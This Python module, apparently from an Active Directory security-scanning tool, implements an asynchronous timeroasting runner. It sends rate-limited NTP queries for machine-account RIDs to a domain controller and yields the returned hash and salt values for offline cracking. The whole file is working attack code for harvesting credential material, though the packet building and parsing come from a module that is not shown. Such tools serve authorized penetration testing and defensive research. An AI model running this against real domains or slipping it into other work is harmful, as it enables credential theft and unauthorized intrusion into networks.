"""Async UDP timeroasting runner — built on the asysocks UniClient/Endpoint stack.

Sends NTP queries at a controlled rate via asysocks UDP Endpoint, receives signed
responses concurrently, and yields TimeroastHashResult objects as they arrive.

asysocks rationale (vs raw asyncio.create_datagram_endpoint):
    Every other network primitive in the codebase (LDAP, SMB, Kerberos TCP) goes
    through asysocks UniClient. Using asysocks for UDP keeps the network layer
    consistent and makes future proxy/pivot support a UniTarget config change
    rather than an architectural rewrite of this module.
"""

from __future__ import annotations

import asyncio
import contextlib
import time
from collections.abc import AsyncIterator

from asysocks.unicomm.client import UniClient
from asysocks.unicomm.common.target import UniProto, UniTarget

from adscan_internal.services.timeroasting.config import (
    TimeroastConfig,
    TimeroastHashResult,
    TimeroastRunResult,
)
from adscan_internal.services.timeroasting.protocol import (
    build_ntp_query,
    parse_ntp_response,
)

_NTP_PORT = 123
_RECV_POLL_INTERVAL = 0.5


def _build_target(config: TimeroastConfig) -> UniTarget:
    """Build an asysocks UDP UniTarget aimed at the DC's NTP service."""
    return UniTarget(
        ip=config.dc_ip,
        port=_NTP_PORT,
        protocol=UniProto.CLIENT_UDP,
        timeout=5,
    )


async def stream_timeroast(config: TimeroastConfig) -> AsyncIterator[TimeroastHashResult]:
    """Async generator — yields hashes as NTP responses arrive from the DC.

    Iterating callers can update a live progress display between yields.
    Internally drives an asysocks UDP Endpoint with two concurrent flows:
      - send_task: paces NTP queries at config.rate packets/second
      - main loop: awaits Endpoint.read_one() and yields parsed responses
    """
    target = _build_target(config)
    client = UniClient(target, None)  # no packetizer — raw datagrams
    endpoint = await client.connect()

    seen_rids: set[int] = set()
    send_interval = 1.0 / max(config.rate, 1)

    try:
        send_task = asyncio.create_task(
            _send_loop(endpoint, config, send_interval)
        )
        deadline = time.monotonic() + _estimated_duration(config) + config.timeout

        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            try:
                data = await asyncio.wait_for(
                    endpoint.read_one(),
                    timeout=min(remaining, _RECV_POLL_INTERVAL),
                )
            except asyncio.TimeoutError:
                if send_task.done():
                    # All RIDs sent — wait out the remaining timeout window
                    deadline = min(deadline, time.monotonic() + config.timeout)
                continue

            if data is None:
                break  # Endpoint closed

            parsed = parse_ntp_response(data, old_password=config.old_password)
            if parsed is None:
                continue

            rid, hash_hex, salt_hex = parsed
            if rid in seen_rids:
                continue
            seen_rids.add(rid)

            # Extend deadline: DC is still responding, give it more time
            deadline = time.monotonic() + config.timeout

            yield TimeroastHashResult(rid=rid, hash_hex=hash_hex, salt_hex=salt_hex)

        send_task.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await send_task
    finally:
        with contextlib.suppress(Exception):
            endpoint.close()


async def run_timeroast(config: TimeroastConfig) -> TimeroastRunResult:
    """Run timeroasting to completion and return an aggregate result.

    Use stream_timeroast() instead when a live display is needed.
    """
    result = TimeroastRunResult(rids_attempted=len(config.rids))
    try:
        async for h in stream_timeroast(config):
            result.hashes.append(h)
            result.rids_responded += 1
    except PermissionError as exc:
        result.error = (
            f"UDP socket permission denied (need root or cap_net_bind_service): {exc}"
        )
    except OSError as exc:
        result.error = f"Network error reaching {config.dc_ip}:{_NTP_PORT} — {exc}"
    except Exception as exc:
        result.error = f"Timeroast failed: {exc}"
    return result


async def _send_loop(endpoint, config: TimeroastConfig, interval: float) -> None:
    """Send NTP queries for each RID at the configured rate."""
    peer = (config.dc_ip, _NTP_PORT)
    for rid in config.rids:
        query = build_ntp_query(rid, old_password=config.old_password)
        endpoint.send(query, peer)
        await asyncio.sleep(interval)


def _estimated_duration(config: TimeroastConfig) -> float:
    """Best-case time to finish sending all RID queries."""
    return len(config.rids) / max(config.rate, 1)
